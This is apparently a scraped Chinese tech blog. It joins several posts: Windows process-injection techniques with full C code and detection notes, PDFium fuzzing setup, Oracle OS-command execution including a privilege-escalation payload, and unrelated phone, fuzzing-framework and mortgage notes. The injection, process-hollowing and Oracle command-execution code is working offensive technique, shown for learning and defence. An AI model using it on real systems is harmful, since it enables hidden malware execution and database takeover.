需要修改注册表，导入下面的注册表, 重启后生效 1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager]&quot;ExcludeFromKnownDlls&quot;=hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,00,00 1.3 CreateRemoteThread CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API原型如下： 123456789 HANDLE WINAPI CreateRemoteThread(_In_ HANDLE hProcess,_In_ LPSECURITY_ATTRIBUTES lpThreadAttributes,_In_ SIZE_T dwStackSize,_In_ LPTHREAD_START_ROUTINE lpStartAddress,_In_ LPVOID lpParameter,_In_ DWORD dwCreationFlags,_Out_ LPDWORD lpThreadId); hProcess 要注入的进程的句柄 lpStartAddress 远程进程中执行的函数的地址（指针） lpParameter 远程进程中执行的函数的参数的地址 （指针） 实现个DLL 第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。 从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢? 答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内存，然后把我们的数据写到远程进程中去。 在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远程注入DLL了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);if (process == NULL) { printf(&quot;Error: the specified process couldn't be found.\\n&quot;);}/** Get address of the LoadLibrary function.*/LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);if (addr == NULL) { printf(&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\\n&quot;);}/** Allocate new memory region inside the process's address space.*/LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);if (arg == NULL) { printf(&quot;Error: the memory could not be allocated inside the chosen process.\\n&quot;);}/** Write the argument to LoadLibraryA to the process's newly allocated memory region.*/int n = WriteProcessMemory(process, arg, buffer, strlen(buffer), NULL);if (n == 0) { printf(&quot;Error: there was no bytes written to the process's address space.\\n&quot;);}/** Inject our DLL into the process's address space.*/HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, NULL, NULL);if (threadID == NULL) { printf(&quot;Error: the remote thread could not be created.\\n&quot;);}else { printf(&quot;Success: the remote thread was successfully created.\\n&quot;);}/** Close the handle to the process, becuase we've already injected the DLL.*/CloseHandle(process); 前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。 很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。 写远程进程内存 第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread还有好几种替代方法, CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个 Native API来启动远程的线程。 RtlCreateUserThread 1.4 AppInit_DLLsHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll 新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。 HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs REG_DWORD 1 表示全局开启 REG_DWORD 0 表示全局关闭 HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\RequireSignedAppInit_DLLs REG_DWORD 0 加载任意DLL REG_DWORD 1 只加载签名的DLL 1.5 QueueUserApcQueueUserApc API 原型如下： DWORD WINAPI QueueUserAPC( In PAPCFUNC pfnAPC, // APC function In HANDLE hThread, // handle of thread In ULONG_PTR dwData // APc function parameter); 这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。 APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者MsgWaitForMultipleObjectsEx时线程进入alertable状态。 所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入APC 对象，基本上总有一个线程是alertable状态。 核心伪代码如下： 123456789101112131415161718192021DWORD ret;char *DllName = 'c:\\\\MyDll.dll';int len = strlen(DllName) + 1;HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);PVOID param = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);if (param != NULL) {if (WriteProcessMemory(hProcess, param, (LPVOID)DllName, len, &amp;ret)) { for (DWORD p = 0; p &lt; NumberOfThreads; p ++) { hThread = OpenThread(THREAD_ALL_ACCESS, 0, ThreadId[p]); if (hThread != 0) { InjectDll(hProcess, hThread, (DWORD)param); CloseHandle(hThread); } }}void InjectDll(HANDLE hProcess, HANDLE hThread, DWORD param) { QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle('kernel32.dll', 'LoadLibraryA', hThread, (DWORD)param）;} 1.6 ZwMapViewOfSection这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。 基本步骤如下： 使用CREATE_SUSPENDED调用CreateProcessW创建进程 使用ZwUnmapViewOfSection卸载进程空间中的原始代码 使用VirtualAllocEx分配内存，确保分配区域可写可执行 使用WriteProcessMemory在分配区域内写入恶意代码 使用SetThreadContext设置线程内容为指定的恶意代码 使用ResumeThread回复进程执行 代码中用到PEB的结构： 1234567&gt;dt nt!_PEB+0x000 InheritedAddressSpace : UChar+0x001 ReadImageFileExecOptions : UChar+0x002 BeingDebugged : UChar+0x003 SpareBool : UChar+0x004 Mutant : Ptr32 Void+0x008 ImageBaseAddress : Ptr32 Void 示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114BOOL InjectProcess(LPTSTR VictimFile,LPTSTR InjectExe){ HANDLE hFile; DWORD dwFileSize; //文件大小 IMAGE_DOS_HEADER DosHeader; IMAGE_NT_HEADERS NtHeader; PROCESS_INFORMATION pi; STARTUPINFO si; CONTEXT context; PVOID ImageBase; unsigned long ImageSize; unsigned long BaseAddr; unsigned long retByte = 0; LONG offset; HMODULE hNtDll=GetModuleHandle(&quot;ntdll.dll&quot;); if(!hNtDll) return FALSE; ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)GetProcAddress(hNtDll,&quot;ZwUnmapViewOfSection&quot;); memset(&amp;si, 0, sizeof(si)); memset(&amp;pi, 0, sizeof(pi)); si.cb = sizeof(si); hFile = ::CreateFile(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL); if (hFile == INVALID_HANDLE_VALUE) { return FALSE; } ::SetFilePointer(hFile, 0, NULL, FILE_BEGIN); dwFileSize = ::GetFileSize(hFile, NULL); LPBYTE pBuf = new BYTE[dwFileSize]; memset(pBuf, 0, dwFileSize); DWORD dwNumberOfBytesRead = 0; ::ReadFile( hFile , pBuf , dwFileSize , &amp;dwNumberOfBytesRead , NULL ); ::CopyMemory((void *)&amp;DosHeader,pBuf,sizeof(IMAGE_DOS_HEADER)); ::CopyMemory((void *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],sizeof(IMAGE_NT_HEADERS)); //检查PE结构 //以挂起方式进程 BOOL res = CreateProcess(NULL,VictimFile,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&amp;si,&amp;pi); if (res) { context.ContextFlags = CONTEXT_FULL; if (!GetThreadContext(pi.hThread,&amp;context)) //如果调用失败 { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return FALSE; } ReadProcessMemory(pi.hProcess,(void *)(context.Ebx + 8),&amp;BaseAddr,sizeof(unsigned long),NULL); if (!BaseAddr) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return FALSE; } //拆卸傀儡进程内存模块 if (ZwUnmapViewOfSection((unsigned long)pi.hProcess,BaseAddr)) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return FALSE; } ImageBase = VirtualAllocEx(pi.hProcess, (void *)NtHeader.OptionalHeader.ImageBase, NtHeader.OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE); //ImageBase 0x00400000 if (ImageBase == NULL) { DWORD wrongFlag = GetLastError(); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return FALSE; } //替换傀儡进程内存数据 if(!WriteProcessMemory(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte)) { DWORD wrongFlag2 = GetLastError(); } //DOS 头 + PE 头 + 区块表的总大小 //定位到区块头 offset = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS); IMAGE_SECTION_HEADER secHeader; WORD i = 0; for (;i &lt; NtHeader.FileHeader.NumberOfSections;i++) { //定位到各个区块 ::CopyMemory((void *)&amp;secHeader, &amp;pBuf[offset + i*sizeof(IMAGE_SECTION_HEADER)],sizeof(IMAGE_SECTION_HEADER)); WriteProcessMemory(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte); VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr); } context.ContextFlags = CONTEXT_FULL; //重置 执行文件入口 WriteProcessMemory(pi.hProcess, (void *)(context.Ebx + 8), &amp;ImageBase, //4194304 4, &amp;retByte); context.Eax = (unsigned long)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint; SetThreadContext(pi.hThread,&amp;context); ResumeThread(pi.hThread); } CloseHandle(pi.hThread); CloseHandle(pi.hProcess); ::CloseHandle(hFile); delete[] pBuf; return TRUE;} 2. 检测方法 注册表相关注入继续可以通过Hook写注册表相关API实现监控 SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们 关注的地方。但是输入法之类的正常程序也可能使用注入技术。 CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作， 后续从两个维度来进行检查 2.1 检查跨进程写入的数据虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过特征可以识别出来 写入的数据是PE文件 写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据) 写入超长数据 2.2 检查线程代码执行部分地址检查代码地址是否在WriteProcessMemory写入的数据区域之内 参考链接 Windows DLL Injection Basics 使用异步过程调用（APC）实现模块注入 Ring3下WX方法结束微点2009 New method of injection The Ultimate Win32 code injection Reference","link":"/cn/process_injection/"},{"title":"使用 afl-fuzz fuzz pdfium","text":"下载源码先在 https://pdfium.googlesource.com/pdfium/ 下载源码. 12345mkdir repocd repogclient config --unmanaged https://pdfium.googlesource.com/pdfium.gitgclient synccd pdfium gclient 命令在 depot_tools 中, 需要安装 参考下面的文章 http://www.chromium.org/developers/how-tos/install-depot-tools 12git clone https://chromium.googlesource.com/chromium/tools/depot_tools.gitexport PATH=`pwd`/depot_tools:&quot;$PATH&quot; 主要gclient sync 同步时需要翻墙，可以简单的使用环境变量的方法。 https_proxy=http://localhost:8118 gclient sync 下载 download google storage过程中还会遇到一个网络问题，需要编写配置文件 ~/.boto 123[Boto]proxy = 127.0.0.1 # 不带 http://proxy_port= 8118 export NO_AUTH_BOTO_CONFIG=~/.boto 源码包非常大，大概有1G多，需要耐心等待。 编译编译需要使用 ubuntu 或者 Debian 系统，其他系统的依赖问题解决起来比较麻烦，如果是上面两种操作系统的话，有脚本自动安装依赖。 ./build/install-build-deps.sh 安装完所以依赖后就可以开始编译了，首先要先生成 gn 文件 (2016 年google 放弃使用原来的 gyp 编译方式) gn args out/afl 会调用vim 编译器， 输入下面的内容 1234567891011121314151617181920212223# Build arguments go here.# See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.use_goma = false # Googlers only. Make sure goma is installed and running first.is_debug = false # Enable debugging features.pdf_use_skia = true # Set true to enable experimental skia backend.pdf_use_skia_paths = false # Set true to enable experimental skia backend (paths only).pdf_enable_xfa = true # Set false to remove XFA support (implies JS support).pdf_enable_v8 = true # Set false to remove Javascript support.pdf_is_standalone = true # Set for a non-embedded build.is_component_build = false # Disable component build (must be false)v8_static_library = trueclang_use_chrome_plugins = false # Currently must be false.use_sysroot = false # Currently must be false on Linux, but entirely omitted on windows.use_afl = true#is_asan = trueenable_nacl = trueoptimize_for_fuzzing = truesymbol_level=1 使用 ASAN 编译会报错，暂时不开启，接下来要解决 afl 的问题了， pdfium 的 third_party中不包含 afl-fuzz 的源代码，需要到 chromium.googlesource.com 项目下载。chromium 项目支持 libfuzzer 和 afl-fuzz，只要使用开关， use_libfuzzer = true或者 use_afl = true 即可打开。 要编译生成 pdfium_test, 必须指定 pdf_is_standalone = true, pdfium 源码仓库中没有afl-fuzz 的代码，需要自己下载。 https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/ 可以直接下载 .tgz 文件https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz 下载后将源码 copy 到 ~/repo/pdfium/third_party/afl 中, 使用 ninja -C out/afl 编译整个项目。 使用 is_debug=false 可以明显提高fuzzing 速度，应该开启。另外一个比较有用的是symbol_level, 设置 symbol_level=1 可以添加必要的调试符号，便于gdb调试。 在编译 skia backend 支持时，需要额外处理， 使用 C++14 1use_cxx11 = false afl-fuzz随着 chromium 代码的更新， afl 源码编译出现了一些小问题，需要处理。 src/third_party/afl/patches/0001-fix-build-with-std-c11.patch 123456789101112131415161718192021222324252627diff --git a/afl-fuzz.c b/afl-fuzz.cindex 01b4afef0ecc..f0d564a33037 100644--- a/afl-fuzz.c+++ b/afl-fuzz.c@@ -23,7 +23,9 @@ #define AFL_MAIN #define MESSAGES_TO_STDOUT +#ifndef _GNU_SOURCE #define _GNU_SOURCE+#endif #define _FILE_OFFSET_BITS 64 #include &quot;config.h&quot;diff --git a/types.h b/types.hindex 784d3a7a286d..d24d1fdd97e8 100644--- a/types.h+++ b/types.h@@ -78,7 +78,7 @@ typedef int64_t s64; #define STRINGIFY(x) STRINGIFY_INTERNAL(x) #define MEM_BARRIER() \\- asm volatile(&quot;&quot; ::: &quot;memory&quot;)+ __asm__ volatile(&quot;&quot; ::: &quot;memory&quot;) #define likely(_x) __builtin_expect(!!(_x), 1) #define unlikely(_x) __builtin_expect(!!(_x), 0) afl-fuzz 的使用和其他项目一样。初始的种子文件有几个地方可以获取： https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/ https://github.com/mozilla/pdf.js/tree/master/test/pdfs ./afl-fuzz -M 01 -m 1024 -i /home/henices/input -o /home/henices/out -x /tmp/pdf.dict -- ./pdfium_test @@ 参考资料 https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md https://fuzzing-project.org/tutorial2.html https://blog.chromium.org/2012/04/fuzzing-for-security.html https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html","link":"/cn/pdfium-fuzz.public/"},{"title":"一些杂谈","text":"整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。 在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专业。很多人不太明白专业和非专业之间的差距，可以想象一下你和一 个围棋九段的人下围棋，怎么换到医学领域大家就都是专家了？ 我看到一个建议轻征不隔离，把资源让给重症者。 大家觉得这个建议如何？提这个建议的人说，主要依据是死亡人不多。这个犯了几个错误， 第一，要看死亡率，而不是死亡人数，患病的人多了，自然死人的就多了。第二，根据我 有限的常识，病毒是会自适应性的进化的，感染的人多了，可能就会产生更nb 的变种了。 这个事情主要还是相信国家，相信我们的祖国。我觉得这个事情一定会解决了，只是时间 和损失程度问题，一季度的gdp 肯定是受影响了，希望疫情快点过去，天佑中华！ 最后希望所有看到此文的，新年幸福安康！","link":"/cn/other/"},{"title":"Execute os command in Oracle Database","text":"1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; ASimport java.lang.*;import java.io.*;public class JAVACMD{ public static void execCommand (String command) throws IOException { try { String[] finalCommand; if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) != -1) { finalCommand = new String[4]; finalCommand[0] = &quot;C:\\\\windows\\\\system32\\\\cmd.exe&quot;; finalCommand[1] = &quot;/y&quot;; finalCommand[2] = &quot;/c&quot;; finalCommand[3] = command; } else { finalCommand = new String[3]; finalCommand[0] = &quot;/bin/sh&quot;; finalCommand[1] = &quot;-c&quot;; finalCommand[2] = command; } Process p = Runtime.getRuntime().exec(finalCommand); if (p.waitFor() != 0) { if (p.exitValue() == 1) System.err.println(&quot;command execute failed.&quot;); } BufferedInputStream in = new BufferedInputStream(p.getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String lineStr; while ((lineStr = inBr.readLine()) != null) System.out.println(lineStr); inBr.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } }};/CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2)AS LANGUAGE JAVANAME 'JAVACMD.execCommand (java.lang.String)';/ 1.1.2 设置输出12set serveroutput on size 100000;exec dbms_java.set_output(100000); 1.1.3 需要的权限可以使用下面的语句查询相关权限 用户权限 1select * from session_privs; JAVA 权限 12select * from dba_java_policy;select * from user_java_policy; 使用java代码执行系统命令需要的权限，可以使用下面语句进行授权： 123exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute');exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ''); 1.1.4 实验结果非常不错支持回显。 12345SQL&gt; exec javacmdproc('/bin/uname -a');Linux localhost.localdomain 2.6.32-100.34.1.el6uek.i686 #1 SMP Wed May 2517:28:36 EDT 2011 i686 i686 i386 GNU/LinuxPL/SQL procedure successfully completed. 1.1.5 注意需要使用全路径 1.2 DBMS_SCHEDULAR1.2.1 DBMS_SCHEDULAR 简介这个和Windows上的计划任务类似。 1.2.2 需要的权限 CREATE JOB CREATE EXTERNAL JOB EXECUTE on dbms_scheduler (granted to public by default) grant create job, create external job to scott ; 1.2.3 执行的语句1234567891011121314151617181920212223BEGINDBMS_SCHEDULER.CREATE_PROGRAM (program_name=&gt; 'MyCmd',program_type=&gt; 'EXECUTABLE',-- Use the ampersand to break outprogram_action =&gt; '/tmp/a.sh',enabled=&gt; TRUE,comments=&gt; 'Run a command using shell metacharacters.' );END;/BEGINDBMS_SCHEDULER.CREATE_JOB ( job_name=&gt; 'X', program_name=&gt; 'MyCmd', repeat_interval=&gt; 'FREQ=SECONDLY;INTERVAL=10', enabled=&gt; TRUE, comments=&gt; 'Every 10 seconds');END;/exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; 'X'); 1.2.4 注意 原先使用 || 等 metacharacters 的bug已经修复，只能使用参数 Windows系统必须开启OracleJobSchedulerSID 服务 Linux系统上相关文件的权限必须正确 高版本的Linux，执行的group已经被Oracle将为nobody 总之这个方法局限行很大，不推荐使用，列在这里只是做一个备忘。 1.3 使用oradebug oradebug 简介oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help命令，查看oradebug的用法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748SQL&gt; oradebug helpHELP [command] Describe one or all commandsSETMYPID Debug current processSETOSPID &lt;ospid&gt; Set OS pid of process to debugSETORAPID &lt;orapid&gt; ['force'] Set Oracle pid of process to debugSETORAPNAME &lt;orapname&gt; Set Oracle process name to debugSHORT_STACK Get abridged OS stackCURRENT_SQL Get current SQLDUMP &lt;dump_name&gt; &lt;lvl&gt; [addr] Invoke named dumpDUMPSGA [bytes] Dump fixed SGADUMPLIST Print a list of available dumpsEVENT &lt;text&gt; Set trace event in processSESSION_EVENT &lt;text&gt; Set trace event in sessionDUMPVAR &lt;p|s|uga&gt; &lt;name&gt; [level] Print/dump a fixed PGA/SGA/UGA variableDUMPTYPE &lt;address&gt; &lt;type&gt; &lt;count&gt; Print/dump an address with type infoSETVAR &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt; Modify a fixed PGA/SGA/UGA variablePEEK &lt;addr&gt; &lt;len&gt; [level] Print/Dump memoryPOKE &lt;addr&gt; &lt;len&gt; &lt;value&gt; Modify memoryWAKEUP &lt;orapid&gt; Wake up Oracle processSUSPEND Suspend executionRESUME Resume executionFLUSH Flush pending writes to trace fileCLOSE_TRACE Close trace fileTRACEFILE_NAME Get name of trace fileLKDEBUG Invoke global enqueue service debuggerNSDBX Invoke CGS name-service debugger-G &lt;Inst-List | def | all&gt; Parallel oradebug command prefix-R &lt;Inst-List | def | all&gt; Parallel oradebug prefix (return outputSETINST &lt;instance# .. | all&gt; Set instance list in double quotesSGATOFILE &lt;SGA dump dir&gt; Dump SGA to file; dirname in double quotesDMPCOWSGA &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname in double quotesMAPCOWSGA &lt;SGA dump dir&gt; Map SGA as COW; dirname in double quotesHANGANALYZE [level] [syslevel] Analyze system hangFFBEGIN Flash Freeze the InstanceFFDEREGISTER FF deregister instance from clusterFFTERMINST Call exit and terminate instanceFFRESUMEINST Resume the flash frozen instanceFFSTATUS Flash freeze status of instanceSKDSTTPCS &lt;ifname&gt; &lt;ofname&gt; Helps translate PCs to namesWATCH &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt; Watch a region of memoryDELETE &lt;local|global|target&gt; watchpoint &lt;id&gt; Delete a watchpointSHOW &lt;local|global|target&gt; watchpoints Show watchpointsDIRECT_ACCESS &lt;set/enable/disable command | select query&gt; Fixed table accessCORE Dump core without crashing processIPC Dump ipc informationUNLIMIT Unlimit the size of the trace filePROCSTAT Dump process statisticsCALL [-t count] &lt;func&gt; [arg1]...[argn] Invoke function with arguments 功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。 执行的语句oradebug setmypid; oradebug call system &quot;/usr/bin/whoami &gt;/tmp/ret&quot;; 注意 这里权限要求是SYSDBA 双引号里必须是使用TAB而不能使用空格 Linux 和 Windows 下的ORACLE都能利用成功 2. 黑客方法下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞已经被被修复) 12345678910DECLAREPOL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,'java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,'ENABLED’ from dual;BEGINOPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;/ 在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session权限的用户可以给自己授权所有java 权限。 2.1 DBMS_JAVA_TEST.FUNCALL2.1.1 执行的语句1Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls&gt;/tmp/OUT2.LST') from dual; 2.1.2 需要的权限1exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute'); 2.1.3 受影响系统11g R1, 11g R2 2.2 DBMS_JAVA.RUNJAVA2.2.1 执行的语句1SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST') FROM DUAL; 2.2.2 需要的权限1exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute'); 2.2.3 受影响系统10g R2, 11g R1, 11g R2 参考链接 Using Java to run os command DBMS_SCHEDULER oradebug BlackHat-DC-2010-Litchfield-Oracle11g Hacking Oracle from the Web","link":"/cn/oracle_run_os_cmd/"},{"title":"一加 (oneplus ) 3T 非root 开启 P3 色域","text":"一加3T其实和一加5用的是同一块屏幕，网上流传的方法多需要root权限。非root 开启 p3 色域的方法，连接 adb 输入下面的命令 settings put system screen_color_mode_settings_value 4 实测有效，重启后不失效。","link":"/cn/oneplus3T_p3/"},{"title":"onefuzz 简单分析","text":"deploy agent (部署)123unzip onefuzz-deployment-$VERSION.zippip install -r requirements.txt./deploy.py $REGION $RESOURCE_GROUP_NAME $ONEFUZZ_INSTANCE_NAME $CONTACT_EMAIL_ADDRESS Azure CLI logged in 后，执行上面命令可以在 Azure 上部署 agent 需要订阅 Azure， 可能要收费 安装 onefuzz CLI123wget https://github.com/microsoft/onefuzz/releases/download/1.0.0/onefuzz-1.0.0-py3-none-any.whlwget https://github.com/microsoft/onefuzz/releases/download/1.0.0/onefuzztypes-1.0.0-py3-none-any.whlpip install ./onefuzz*.whl 执行 fuzz 任务1onefuzz template libfuzzer basic my-project my-target build-1 my-pool --target_exe fuzz.exe 支持的平台 Python 的 CLI 客户端，需要 Python 3.7 + Azure 的 OS image 支持 Windows 10 和 Ubuntu Server 18.04 libfuzzer 支持 llvm 8+ (windows, Linux x86/x64), MSVC 16.8+ (支持 ASAN) 支持的 Fuzz 工具onefuzz 中集成了几个 fuzz 工具： afl afl++ libfuzzer 和 radasma OneFuzz 的主要工作主要工作是利用微软的 Azure 云平台进行 fuzz，实现了 Python 版本的接口，可以远程直接操作 Azure 的资源进行 fuzz api 接口： api-serviceagent： agent 项目进展情况onefuzz 项目主要是一个 fuzz 框架，项目成熟度不高和 Google 的 ClusterFuzz 相比有较大差距。Fuzz 过程也是简单调用fuzz 工具，没有处理特殊情况。文档完备程度也不高，比较感兴趣的 MSVC 和 libfuzzer、ASAN 的集成也没有看到具体代码。另外和微软的 Azrue 深度绑定，用起来也不是太方便，后续将继续关注此项目的进展情况。 一些有用的链接https://github.com/microsoft/onefuzz/blob/main/docs/getting-started.mdhttps://github.com/microsoft/onefuzz/blob/main/docs/supported-platforms.md 在线演示","link":"/cn/onefuzz/"},{"title":"lpr 和房贷的那些事","text":"原来的机制在 LPR 之前，我国贷款利率锚定 中国人民银行发布的 “贷款基准利率”。 1房贷利率 = 贷款基准利率 x （1 + 浮动） 浮动可以上浮，也可以下浮， 上浮意味着贷款利率大于贷款基准利率，反之下浮则是小于。 LPR 新机制MLF 是我国央行向商业银行放贷的一种方式 （中期借款便利），商业银行将一些抵押物质押给央行，换取一定期限，数额的贷款，同时向央行支付利息。央行通过控制 MLF 的数量总额和利率，从而影响市场。 商业银行可以选择从央行贷款，也可以使用从其他银行贷款，所以 MLF 不能偏离市场太多，也是一种市场化的利率调控手段。 商业银行拿到资金后，需要放贷给个人和企业，放贷需要参考央行的基准利率。所以这种市场上就有两种利率，如果贷款的基准利率过高，钱就会滞留银行，这样就引入了 LPR。 锚定 LPR，也就是浮动利率，会随着市场上资金的充盈程度变化。 1LPR = MLF 利率 + 风险利润加点 风险利润加点由 18家银行决定，这18家银行是 中国工商银行，中国农业银行，中国建设银行，交通银行，中信银行，招商银行，兴业银行，浦东发展银行，中国民生银行，西安银行，台州银行，上海农村商业银行， 广东顺德农村商业银行，渣打银行（中国），花旗银行（中国），微众银行，网商银行。 LPR 